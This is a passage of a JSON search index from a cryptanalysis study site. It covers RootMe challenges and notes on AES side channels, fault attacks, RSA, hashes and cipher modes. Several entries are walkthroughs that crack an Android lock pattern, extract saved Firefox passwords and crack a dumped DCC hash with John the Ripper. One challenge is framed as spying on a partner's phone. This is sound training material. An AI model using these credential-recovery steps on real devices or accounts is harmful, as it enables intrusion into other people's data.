    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/cpa",
    "t": "Side channel AES: CPA ",
    "c": "Side channel AES: CPA  RootMe Challenge: Side Channel - AES: CPA : We performed 200 measurements of the power consumption of a cryptographic device during the encryption of a random text (PTI). The corresponding cipher (CTO) was also saved during the operation. Find the AES key that was used. Note: Values have been normalized to reduce data size.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "d3ef32b8862b8b19dcfb2b747598c9e9",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/corrupted-key1",
    "t": "RSA Corrupted key: Private exponent ",
    "c": "RSA Corrupted key: Private exponent  RootMe Challenge: Private exponent : As part of an investigation we recovered the dump of a USB key. Most of the information are corrupted, we hope you will be able to recover it. Decrypt the secret data. Resources  Attack on RSA Cryptosystem - Sachin Upadhyay",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8938eca31c1fa8b0d826de19957958bb",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/sc-first-round",
    "t": "Side channel AES: first round ",
    "c": "Side channel AES: first round  RootMe Challenge: Side Channel - AES: first round : To perform secure AES encryption, your intern R. Hamming has just acquired a new state-of-the-art embedded card. Young, carefree and confident, he challenges you to find the encryption key he uses. But beware, this card is resistant to fault injections! Armed only with your oscilloscope, you, the great K. Pearson, decide to take an interest in the power consumption of this mysterious card… Notes: The validation flag is the key used by AES converted to ASCII format The length of the key is the minimum size of an AES key The .bini8 file starts with an 8 bytes header in little endian. The first 4 bytes give you the number of bytes representing a single capture during AES encryption. The next 4 bytes tell you the number of AES encryption runs that were performed to generate this file. The bytes are signed, and 1 byte = 1 piece of data (except for the header) You have the plaintexts used. They are in unsigned hexadecimal format. Resources  Correlation Power Analysis with a Leakage Model",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "aeb071c7a2135e4b3eebbd604f297f76",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/dh/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  In November 1976, Stanford researchers Whitfield Diffie and Martin Hellman published a research paper titled “New Directions in Cryptography” that revolutionised cryptography forever. In their paper, they introduced the notion of public-key encryption and signatures, though they didn’t actually have any of those schemes; they simply had what they termed a public-key distribution scheme, a protocol that allows two parties to establish a shared secret by exchanging information visible to an eavesdropper. This protocol is now known as the Diffie–Hellman (DH) protocol. Why?  Diffie–Hellman schemes are only secure when their parameters are well-chosen. How? ",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "a0b34d6fe669a12c44bb613d609d8489",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/data/bmp-xor",
    "t": "Known plaintext XOR ",
    "c": "Known plaintext XOR  RootMe: Known plaintext - XOR : This BMP picture was mistakenly encrypted. Can you recover it? For this challenge you will need to decipher a simple XORed picture. Solution  Getting the file and looking at the header with hexeditor -r ch3.bmp : 24 2C 9A E3 62 6E 66 61 6C 6C 53 6E 66 61 The Bitmap file header is encrypted too. I don’t know what the unencrypted size will be, so only have the first two bytes plaintext: 0x42 0x4D for BM . And why make life harder than need be. Install xortool : pip3 install xortool Collecting xortool Downloading xortool-1.0.2-py3-none-any.whl (11 kB) Requirement already satisfied: docopt<0.7.0,>=0.6.2 in /usr/lib/python3/dist-packages (from xortool) (0.6.2) Installing collected packages: xortool Successfully installed xortool-1.0.2 Get the key: xortool -c 20 ch3.bmp The most probable key lengths: 1: 10.6% 3: 11.6% 6: 18.5% 9: 8.8% 12: 13.8% 15: 6.6% 18: 10.4% 24: 8.1% 30: 6.4% 36: 5.2% Key-length can be 3*n 1 possible key(s) of length 6: FALLEN Found 0 plaintexts with 95%+ valid characters See files filename-key.csv, filename-char_used-perc_valid.csv Decrypt with found key: xortool-xor -s fallen -f ch3.bmp > flag.bmp Check: file flag.bmp flag.bmp: PC bitmap, Windows 3.x format, 463 x 356 x 24, image size 495552, resolution 2835 x 2835 px/m, cbSize 495606, bits offset 54 And view the decrypted image to get the flag.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1906d3237383625334c4337db8a12319",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/4-rounds",
    "t": "AES 4 rounds ",
    "c": "AES 4 rounds  RootMe Challenge: Classical attack on AES-128 reduced to 4 rounds : The encryption oracle available at the address below performs 4-round AES-128 encryption (the last round does not apply the MixColumns transformation). You can query as many chosen plaintexts as you need. Exploit this reduction of the round number to recover the secret key and then retrieve the password to validate this challenge. Time limitation None Data limitation None",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "37d1387e5d5f3b5d0525629242bb2d9d",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/ciphers/polybe",
    "t": "Mono-alphabetic substitution: Polybe ",
    "c": "Mono-alphabetic substitution: Polybe  RootMe Challenge: Monoalphabetic substitution - Polybe : A strange person contact you after purchasing a parchment of weird origin … He is counting on your quick wit to decrypt this message! You will need to deploy all your cryptanalyses faculties. Solution  C P b4 m a4 o a1 t d3 d a3 e e1 p e3 a d1 s c4 l e5 u b1 r d2 i d4 n c5 v b2 h c1 q c2 g e2 f c3 b b3 c b5 x d5 y a2 j",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "db285e610837abaaf09f093596c57519",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/stream",
    "t": "Down streams ",
    "c": "Down streams  Stream ciphers are deterministic. This allows for decrypting by regenerating the pseudorandom bits used to encrypt. Stream ciphers take two values: a key and a nonce. The key should be secret and is usually 128 or 256 bits. The nonce does not have to be secret, but should be unique for each key and is usually between 64 and 128 bits. The nonce is sometimes called the IV, for initial value. Stateful stream ciphers have a secret internal state that evolves throughout keystream generation. The cipher initialises the state from the key and the nonce and then calls an update function to update the state value and produce one or more keystream bits from the state. Counter-based stream ciphers produce chunks of keystream from a key, a nonce, and a counter value. No secret state is memorised during keystream generation. Linear Feedback Shift Registers  Linear feedback shift registers (LFSRs) are FSRs with a linear feedback function, a function that is the XOR of some bits of the state. Thanks to this linearity, LFSRs can be analyzed using notions like linear complexity, finite fields, and primitive polynomials. The choice which bits are XORed together is essential for the period of the LFSR and thus for its cryptographic value. The position of the bits must be selected such to guarantee a maximal period ( \\(2^n – 1\\) ). The maximal period of an n-bit LFSR is \\(2^n – 1\\) , not \\(2^n\\) , because the all-zero state always loops on itself infinitely. Take the indices of the bits, from 1 for the rightmost to n for the leftmost, and write the polynomial expression \\(1 + X + X^2 + . . . + X^n\\) , where the term \\(X^i\\) is only included if the \\(i\\) th bit is one of the bits XORed in the feedback function. The period is maximal if and only if that polynomial is primitive. To be primitive, the polynomial must be irreducible, meaning that it ca not be factorised (written as a product of smaller polynomials). Using an LFSR as a stream cipher is insecure. If \\(n\\) is the LFSR’s bit length, an attacker needs only \\(n\\) output bits to recover the LFSR’s initial state, allowing them to determine all previous bits and predict all future bits. This attack is possible because the Berlekamp–Massey algorithm can be used to solve the equations defined by the LFSR’s mathematical structure to find not only the LFSR’s initial state but also its feedback polynomial. It isn’t even needed to know the exact length of the LFSR; repeat the Berlekamp–Massey algorithm for all possible values of \\(n\\) until you hit the right one. RootMe challenges  LFSR - Known plaintext Security  Many things can go wrong with stream ciphers, from brittle, insecure designs to strong algorithms incorrectly implemented. The most common failure seen with stream ciphers occurs when a nonce is reused more than once with the same key. This produces identical keystreams, allowing an adversary to break the encryption by XORing two ciphertexts together. Resources  Serious Cryptography - A Practical Introduction to Modern Encryption by Jean-Philippe Aumasson Linear Feedback Shift Registers (LFSR) - Auburn Univ Tutorial: Linear Feedback Shift Registers (LFSRs) – Part 1 Tutorial: Linear Feedback Shift Registers (LFSRs) – Part 2 Tutorial: Linear Feedback Shift Registers (LFSRs) – Part 3",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "af5293635e09272eecc709197032ee4e",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/fault1",
    "t": "AES Fault attack #1 ",
    "c": "AES Fault attack #1  RootMe Challenge: Recover the key using a simulated fault attack : Recover the AES-128 key to get the validation password for this challenge. To solve this challenge you have access to an encryption oracle and may inject a single fault during the encryption of a chosen plaintext, repeatedly. In order to simulate the fault injection the oracle takes an additional parameter: an integer between 1 and 160 which represents one of the 160 Sboxes applied during an AES-128 encryption. The fault is injected on a single bit at the output of that Sbox. Time limitation 120 seconds Data limitation 32 chosen plaintexts and fault injections Differential Fault attacks  Differential Fault Attacks (DFA) has emerged. DFA has shown that several ciphers can be compromised if the faults can be suitably controlled. DFA is not restricted to old ciphers, but can be a powerful attack vector even for modern ciphers, like the Advanced Encryption Standard (AES). Resources  A Differential Fault Attack Technique against SPN Structures, with Application to the AES and KHAZAD - Piret and Quisquater",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5cd4e93ac83373796f07f110be18b243",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/modulus",
    "t": "RSA Common modulus ",
    "c": "RSA Common modulus  RootMe Challenge: Arithmetic Power : A message was sent by a company to two of its engineers, but they were negligent in the choice of the keys of its employees. Decrypt the sent message. Extended GCD algorithm and Bezout’s identity. Resources  Bézout’s Identity - Theorem of the day PGCD PGCM - Théorèmes de Bézout et de Gauss Bézout’s identity - euclidean algorithm",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "45f3e5bca15a5d4c1c95d57ef2bd6981",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/sha3",
    "t": "SHA-3 Hash ",
    "c": "SHA-3 Hash  RootMe Challenge: Hash - SHA-3 Reverse the Keccak algorithm : You just got a SHA-3 hash: 0d 6e 57 75 05 f5 0c ac 98 85 e3 1a 70 da 8b b4 7c 59 dd 77 1e 7d 72 2e 13 94 9d 69 2e 60 7b 98 e3 6f b2 b9 21 76 1c a3 7f 94 fb c2 fa 28 40 bb fe dd 82 5e 4f 65 b5 18 7d 0d 88 34 20 35 2b e3 You also have a stack dump at the end of the function that generated this hash. Find the text that produced this hash. SHA-3 was not designed to replace SHA-2. It was the result of a contest to design a new hashing algorithm. The actual algorithm was named Keccak designed by Guido Bertoni, Joan Daemen, Michaël Peeters, and Gilles Van Assche. The United States NIST (National Institute of Standards) published FIPS 202 standardizing the use of SHA-3. Unlike SHA-1 and SHA-2 that use a Merkle-Damgard construction, SHA-3 uses a sponge construction, a type of algorithm which uses an internal state and takes input of any size producing a specific sized output. This makes it a good fit for cryptographic hashes which need to take variable length input and produce a fixed-length output.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "672dc1fd0651f65f05a8bd89bb10a0ca",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/aes",
    "t": "AES busting ",
    "c": "AES busting  AES is a symmetric key, block cipher algorithm. It is used in many common Internet protocols and operating system services, including TLS, IPSec, and file-level or full-disk encryption. Given its ubiquity, it is an important cipher to know how to use, and the principles of (in)correct use of AES transfer easily to (in)correct use of other ciphers. Even though AES is a block cipher, it (like many other block ciphers) can be used in a way that makes it behave like a stream cipher. AES processes blocks of 128 bits using a secret key of 128, 192, or 256 bits, with the 128-bit key being the most common because it makes encryption slightly faster and because the difference between 128- and 256-bit security is meaningless for most applications. AES modes  Mode Notes Electronic Code Book (AES-ECB) Each 16-byte block of plaintext is encrypted independently. Cipher Block Chaining (AES-CBC) Each plaintext block gets XOR-ed with the previous ciphertext block prior to encryption. An initialization vector is used to make sure each encryption has a different ciphertext result. Cipher FeedBack (AES-CFB) The keystream is obtained by encrypting the last ciphertext produced with the block cipher. Output FeedBack (AES-OFB) The keystream is obtained by recursively encrypting the Initialization Vector. Counter (AES-CTR) The keystream is generated by encrypting a sequence of counter blocks with ECB. Galois Counter Mode (AES-GCM) A combination of Counter mode (CTR) and Authentication. Uses a Message Authentication Code (MAC) for authentication. Encrypt-then-authenticate- then-translate (AEX) Another method for Authenticated Encryption with AES. Pros and cons  TL;DR: Use GCM mode for maximum security. Name Pros Cons ECB Simplest. Weakest cipher Padding needed. CBC Each ciphertext is different => It is not possible to know if two hashed data strings originate from the same plaintext. Padding needed. An error in one plain text block will affect all the following blocks. Vulnerable to attacks like padding oracle attacks, chosen-plaintext attacks, and chosen-ciphertext attacks if the initialization vector isn’t changed for every encryption. The previous block must be known to encrypt the next block => No parallelisation of operations => Slow. CFB A stream cipher accepts data of any length => padding not needed. Each ciphertext relies on the other to be decrypted => Corrupted data cannot be recovered. No parallelisation of operations. => Slow. OFB A stream cipher accepts data of any length => padding not needed. The correct IV is needed to decrypt the whole thing => Corrupted data cannot be recovered. No parallelisation of operations => Slow. CTR A stream cipher accepts data of any length => padding not needed. Each counter block can be encrypted separately =>Parallelisation possible => Faster. Corrupted data cannot be recovered. Needs a different IV for each message to be truly secure. GCM Guarantees integrity. Pipelines and parallelisation of operations possible. Minimal computational footprint. Complex implementation. AEX Detects unauthorised modifications. Simpler than GCM to implement. Slower than GCM. ECB  The most basic encryption mode is the electronic codebook (ECB) mode. The message is divided into blocks and each block is encrypted separately. The problem is that if you submit the same plain text more than once, you always get the same ciphertext. This gives attackers a place to begin analysing the cipher to attempt to derive the key. ECB is using the cipher exactly as it is described without improving its security. There is no good reason to use ECB over CBC, if both ends of the communication can support CBC. Cipher block chaining is a strong deterrent to known plain text attacks. CBC  When using cipher block chaining (CBC) mode , each block of plaintext is XOR’d with the previous ciphertext block before being encrypted. This means there is more randomness in the final ciphertext. This is much more secure than electronic codebook mode and is the most common mode. The only issue with CBC is the first block. There is no preceding block of ciphertext to XOR the first plaintext block with. It is common to add an initialization vector (IV) to the first block so that it has something to be XOR’d with. The initialization vector is a pseudorandom number, much like the cipher key. Usually, an IV is only used once, a \\(nonce\\) (Number Only used Once). The decryption process in CBC mode is done as: (1)  \\[\\begin{align} P_1 =& Dec_k(C_1) \\oplus IV\\\\ P_i =& Dec_k(C_i) \\oplus C_{i-1},\\;\\; 1 < i \\leq nb, \\end{align}\\] where \\(nb\\) is the number of blocks. Bit-flipping attack  If you know the position of the target byte, then you can modify the corresponding ciphertext position in the previous ciphertext block. For example, if you modify a byte in the ciphertext \\(C_{i-1}\\) , then \\(P_i\\) will be changed by one block since \\(C_{i-1}\\) only affects the plaintext \\(P_i\\) by \\(\\oplus\\) . A ciphertext byte of \\(C_2\\) is modified: This affects the corresponding byte in the next plaintext block \\(P_3\\) and in the corresponding full plaintext block \\(P_2\\) which has the same index as the modified ciphertext which is garbage. There is an error. An \\(\\text{IV}\\) byte is modified: This affects only the corresponding byte in the first plaintext \\(P_1\\) . If the target plaintext is in the first block, this will not leave a trace. Padding oracle attack  A padding oracle is a system that behaves differently depending on whether the padding in a CBC-encrypted ciphertext is valid. You can see it as a black box or an API that returns either a success or an error value. A padding oracle can be found in a service on a remote host sending error messages when it receives malformed ciphertexts. The preferred method of padding block ciphertexts is PKCS7. In PKSC7, the value of each padded byte is the same as the number of bytes being added. Given a padding oracle, padding oracle attacks record which inputs have a valid padding and which do not, and exploit this information to decrypt chosen ciphertext values. Assume having intercepted a CBC encrypted ciphertext, and being able to connect with a server to pass in any ciphertext, and the server will tell us whether it decrypts to plaintext with valid padding or not. The server is used as oracle. In CBC decryption, each ciphertext is passed through the cipher, then XORed with the previous ciphertext block to give the plaintext. The attack works by calculating the “intermediate state” of the decryption for each ciphertext. This is the state of a ciphertext block after being decrypted by the block cipher but before being XORed with the previous ciphertext block. \\(C_1\\) is known already, as it is just part of the intercepted ciphertext, so if we find \\(I_2\\) then we can trivially find \\(P_2\\) and decrypt the ciphertext. Pick a random block \\(C_1\\) and vary its last byte until the padding oracle accepts the ciphertext as valid. Usually, in a valid ciphertext, \\(C_1[15] ⊕ X[15]\\) = 01, so you’ll find \\(X[15]\\) after trying around 128 values of \\(C1[15]\\) . Find the value \\(X[14]\\) by setting \\(C_1[15]\\) to \\(X[15] ⊕ 02\\) and searching for the \\(C_1[14]\\) that gives correct padding. When the oracle accepts the ciphertext as valid, it means you have found \\(C_1[14]\\) such that \\(C_1[14] ⊕ X[14] = 02\\) . Repeat steps 1 and 2 for all 16 bytes. In the wilderness (real digital world), implementing a padding oracle attack is a bit more complicated than that, because one has to deal with wrong guesses at step 1 . A ciphertext may have valid padding not because \\(P_2\\) ends with a single 01 but because it ends with two 02 bytes or three 03 bytes. But that’s easily managed by testing the validity of ciphertexts where more bytes are modified. CTR  In CTR mode, encryption XORs the plaintext and the stream taken from “encrypting” the nonce, N , and counter, Ctr . Decryption is the same, so you only need the encryption algorithm for both encryption and...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "33e55edcf7652bcf3bc4e9d1ddc0316a",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/data/android-lock",
    "t": "Android lock pattern ",
    "c": "Android lock pattern  RootMe: System - Android lock pattern : Having doubts about the loyalty of your partner, you’ve decided to read SMS, mail, etc. in his/her/hes smartphone. Unfortunately it is locked by schema. In spite of that, you still manage to retrieve system files. You need to find this test scheme to unlock smartphone. Android lock pattern  Instead of storing a lock pattern directly, Android stores a hashed byte array in a system file called gesture.key located in the /data/system folder. Solution  Download and decompress: tar -xvfj ch17.tbz2 android/ android/sbin/ android/sbin/watchdogd android/sbin/adbd android/sbin/ueventd android/proc/ ... Use for example P-Decode : $ python P-Decode.py -f android/data/system/gesture.key |~) |~\\ _ _ _ _| _ |~ ~~|_/}_(_(_)(_|}_ v0.5 [ {41}ndr0id Pa77ern Cr4ck t00l. ] [*] Pattern SHA1 Hash : 2C3422D33FB9DD9CDE87657408E48F4E635713CB [+] Pattern Length : 9 [+] Pattern : 145263780 [+] Pattern SVG : 145263780.svg [*] Time : 0.34 sec",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bb16019f3cb722892c06c2f8e0ab3cb2",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/dcc",
    "t": "DCC Hash ",
    "c": "DCC Hash  Retrieve the password of the Administrator user from the information output by the secretsdump tool of the Impacket suite . Before 2003, Vista Servers stored previous logon information of users locally so that they can log on if a logon server is unavailable at later logon attempts, in a Domain Cache Credential ( DCC ) ( MSCACHE or MSCASH hash). It sorted the hash of the user’s password to prevent pass-the-hash attacks. The hash was stored locally in the Windows registry of the client Windows operating system. The hash could be extracted using python impacket libraries. [*] Target system bootKey: 0xf1527e4742bbac097f937cc4ac8508e4 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ASPNET:1025:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DBAdmin:1028:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: sshd:1037:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: service_user:1038:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [*] Dumping cached domain logon information (domain/username:hash) ROOTME.LOCAL/PODALIRIUS:$DCC2$10240#PODALIRIUS#9d3e8dbe4d9816fa1a5dda431ef2f6f1 ROOTME.LOCAL/SHUTDOWN:$DCC2$10240#SHUTDOWN#9d3e8dbe4d9816fa1a5dda431ef2f6f1 ROOTME.LOCAL/Administrator:15a57c279ebdfea574ad1ff91eb6ef0c:Administrator [*] Dumping LSA Secrets [*] $MACHINE.ACC ROOTME\\PC01$:aes256-cts-hmac-sha1-96:e6d5ab8e29fb4f648490fb1cb099b64dffbd2b9e77d46b8df41bc482d590bfe3 ROOTME\\PC01$:aes128-cts-hmac-sha1-96:971589d11f2a62980fcab210fa442f4a ROOTME\\PC01$:des-cbc-md5:f18f6dfb6b197fe9 ROOTME\\PC01$:plain_password_hex:a918646aa8406975d5ed97534946ef780d48075e618e309b30bf5c9f ROOTME\\PC01$:88c2213866d15f645295e3ebc8779879:ba380afe874fbc0d99b16f8188968133::: [*] DPAPI_SYSTEM dpapi_machinekey:0xf35c35eddeecd7b0da287db2e4f8b89b96387157 dpapi_userkey:0x04b4fb8214fb142f86ca2c34de1866f7e565f6f1 [*] NL$KM 0000 E4 7B 83 10 D7 9D A9 FE C5 B7 F9 CB 81 27 2A 13 .{...........'*. 0010 9B 61 D1 F2 9C 0B 1C 8C 53 55 42 46 02 51 10 AC .A......SUBF.Q.. 0020 4C 02 88 83 CF 37 C8 0C D3 16 71 96 9E 0E B5 46 L....7....Q....F 0030 C5 A4 D0 26 8A 77 40 85 B2 E6 1A 8D CF CB A3 46 ...&.W@........F NL$KM:e47b8310d79da9fec5b7f9cb81272a139b61d1f29c0b1c8c53554246025110ac4c028883cf37c80cd31671969e0eb546c5a4d0268a774085b2e61a8dcfcba346 [*] _SC_sos_scheduler_scibeta ELITE\\CHOUPAPI:Mdp!1256@ [*] _SC_sshd service_user:Mdp!1256@ [*] Cleaning up... Put Administrator:15a57c279ebdfea574ad1ff91eb6ef0c in a file, for example hash.txt . And use hashcat or john to get the Administrator password: $ john --format=mscash --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (mscash, MS Cache Hash (DCC) [MD4 32/64]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ilikethat (Administrator) 1g 0:00:00:00 DONE (2023-03-03 19:27) 20.00g/s 3031Kp/s 3031Kc/s 3031KC/s mckinley1..armenio Use the \"--show --format=mscash\" options to display all of the cracked passwords reliably Session completed.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2bb4df5a27784f3bde2c49cd262ccc98",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Encryption algorithms or implementations thereof can fail to protect confidentiality in many ways. This can be due to a failure to match the security requirements or to set requirements matching reality. Why?  Jump Off This Cliff and think about cryptographic security requirements. How?  Classical ciphers Brute-force attacks Attack models Security goals Block ciphers AES busting Down stream Hacking hashes RSA puzzling Diffie-Hellman Elliptic curve balls",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "2ad49c873ae79bebfe00aa2ee5e05d3f",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/aes/fault2",
    "t": "AES Fault attack #2 ",
    "c": "AES Fault attack #2  RootMe Challenge: Recover the key after a simulated fault attack : Recover the AES-128 key to get the validation password for this challenge. To solve the challenge, you have access to an encryption oracle and have the possibility to inject fault during the encryption of chosen plaintexts. In order to simulate fault injections, the oracle takes as additional input an integer between 1 and 160 that represents one of the 160 Sboxes applied during an AES-128 encryption. The fault is injected on a single bit at the output of that Sbox. This time, you only have 2 injections before recovering the key. Time limitation 120 seconds Data limitation 2 chosen plaintexts and fault injections",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1876e089d0220ec83c8c42965cf389a0",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/hashes/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Hashing is a cornerstone of cryptographic security. It involves the concept of a one-way function or fingerprint. Hash functions only work well when a couple of things are true about them: They produce repeatable, unique values for every input. The output value provides no clues about the input that produced it. Why?  Some hashing functions are better at satisfying these requirements than others. How they work and why choosing a good one is so terribly important. How?  DCC Hash DCC2 Hash LM Hash Message Digest 5 NT Hash SHA-2 Hash CISCO Salted password Hash length extension attack SHA-3 Hash",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "65ed22ade57e12fbda33d65db810bb8e",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/data/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Data at rest in information technology means data that is housed physically on computer data storage in any digital form: data on a PC, laptop, pad or mobile device, server, cloud storage, file hosting services, databases, data warehouses, spreadsheets, archives, tapes, etc. Data at rest can be password protected, encoded, encrypted, tokenized, federated, etc Why?  While data in transit is easier to hack, data at rest is more valuable than data in transit because it often has a higher level of sensitive information. And just because data is at rest does not mean it is not moving. Many data breaches happen due to a lost USB drive or laptop. How?  ELF64 PID encryption Protected PKZIP file Known plaintext XOR File: Insecure storage Mozilla Firefox 14 Android lock pattern",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "66f2075ff03ade4733202682dd32b945",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/data/insecure-storage1",
    "t": "File: Insecure storage Mozilla Firefox 14 ",
    "c": "File: Insecure storage Mozilla Firefox 14  RootMe: File - Insecure storage 1: Mozilla Firefox 14 : Retrieve the user’s password. Solution  firefox_decrypt is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates. This tool does not try to crack or brute-force the Master Password in any way. If the Master Password is not known it will simply fail to recover any data. If there is no Master Password … sudo apt install libnss3 git clone https://github.com/Unode/firefox_decrypt wget http://challenge01.root-me.org/cryptanalyse/ch20/ch20.tgz tar -zxvf ch20.tgz ./.mozilla/ ./.mozilla/extensions/ ./.mozilla/firefox/ ./.mozilla/firefox/profiles.ini ./.mozilla/firefox/o0s0xxhl.default/ ... python firefox_decrypt.py .mozilla/firefox/o0s0xxhl.default/ 2023-03-06 15:40:11,605 - WARNING - profile.ini not found in .mozilla/firefox/o0s0xxhl.default/ 2023-03-06 15:40:11,606 - WARNING - Continuing and assuming '.mozilla/firefox/o0s0xxhl.default/' is a profile location Website: http://www.root-me.org Username: 'shell1cracked' Password: 'xxxxxx'",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "677ac4da8208de62c048d563730bb01e",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/notes/goals",
    "t": "Security goals ",
    "c": "Security goals  A cipher is secure if, even given a large number of plaintext–ciphertext pairs, nothing can be learned about the cipher’s behavior when applied to other plaintexts or ciphertexts. What can be “learned” and what is a “cipher’s behaviour”? Security goals are descriptions of what is considered a successful attack. Cryptographers define two main security goals that correspond to different ideas of what it means to learn something about a cipher’s behaviour. Indistinguishability (IND)  Ciphertexts should be indistinguishable from random strings. This is usually illustrated with a hypothetical game: if an attacker picks two plaintexts and then receives a ciphertext of one of the two (chosen at random), they shouldn’t be able to tell which plaintext was encrypted, even by performing encryption queries with the two plaintexts (and decryption queries, if the model is CCA rather than CPA). Non-malleability (NM)  Given a ciphertext \\(C_1 = E(K, P_1)\\) , it should be impossible to create another ciphertext, \\(C_2\\) , whose corresponding plaintext, \\(P_2\\) , is related to \\(P_1\\) in a meaningful way (for example, to create a \\(P_2\\) that is equal to \\(P_1 ⊕ 1\\) or to \\(P_1 ⊕ X\\) for some known value \\(X\\) ). Surprisingly, the one-time pad is malleable: given a ciphertext \\(C1 = P 1 ⊕ K\\) , you can define \\(C_2 = C_1 ⊕ 1\\) , which is a valid ciphertext of \\(P_2 = P_1 ⊕ 1\\) under the same key \\(K\\) . Oops. Security goals are only useful when combined with an attack model. The convention is to write a security notion as GOAL-MODEL. For example, IND-CPA denotes indistinguishability against chosen-plaintext attackers, NM-CCA denotes nonmalleability against chosen-ciphertext attackers, and so on. Semantic security (IND-CPA)  The Semantic security notion captures the intuition that ciphertexts should not leak any information about plaintexts as long as the key is secret. To achieve IND-CPA security, encryption must return different ciphertexts if called twice on the same plaintext; otherwise, an attacker could identify duplicate plaintexts from their ciphertexts, contradicting the definition that ciphertexts shouldn’t reveal any information. One way to achieve IND-CPA security is to use randomised encryption: With randomised encryption, ciphertexts must be slightly longer than plaintexts in order to allow for more than one possible ciphertext per plaintext. For example, if there are \\(2^{64}\\) possible ciphertexts per plaintext, ciphertexts must be at least 64 bits longer than plaintexts. One of the simplest constructions of a semantically secure cipher uses a deterministic random bit generator (DRBG), an algorithm that returns randomlooking bits given some secret value: (1)  \\[\\begin{align} E(K,R,P) = ( DRBG ( K || R ) \\oplus P , R ) \\end{align}\\] Here, \\(R\\) is a string randomly chosen for each new encryption and given to a DRBG along with the key ( \\(K || R\\) denotes the string consisting of \\(K\\) followed by \\(R\\) ). This approach is reminiscent of the one-time pad: instead of picking a random key of the same length as the message, we leverage a random bit generator to get a random-looking string. The proof that this cipher is IND-CPA secure is simple, if we assume that the DRBG produces random bits. The proof works ad absurdum: if you can distinguish ciphertexts from random strings, which means that you can distinguish \\(DRBG(K || R) ⊕ P\\) from random, then this means that you can distinguish \\(DRBG(K || R)\\) from random. The CPA model lets you get ciphertexts for chosen values of \\(P\\) , so you can XOR \\(P\\) to \\(DRBG(K, R) ⊕ P\\) and get \\(DRBG(K, R)\\) . This is a contradiction, because we started by assuming that \\(DRBG(K, R)\\) can not be distinguished from random, producing random strings. The conclusion therefore is that ciphertexts can not be distinguished from random strings, and therefore that the cipher is secure. Asymmetric encryption  The attack models and security goals for asymmetric encryption are about the same as for symmetric encryption, except that because the encryption key is public, any attacker can make encryption queries by using the public key to encrypt. The default model for asymmetric encryption is therefore the chosen-plaintext attacker (CPA). Symmetric and asymmetric encryption are the two main types of encryption, and they are usually combined to build secure communication systems. They’re also used to form the basis of more sophisticated schemes. Resources  Probabilistic Encryption and How to Play Mental Poker Keeping Secret All Partial Information, by Goldwasser and Micali Serious Cryptography - A Practical Introduction to Modern Encryption by Jean-Philippe Aumasson",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ccffb367d4e9b26324d70125f1551679",
    "u": "https://cryptanalysis.tymyrddin.dev/docs/rsa/fractions",
    "t": "RSA Continued fractions ",
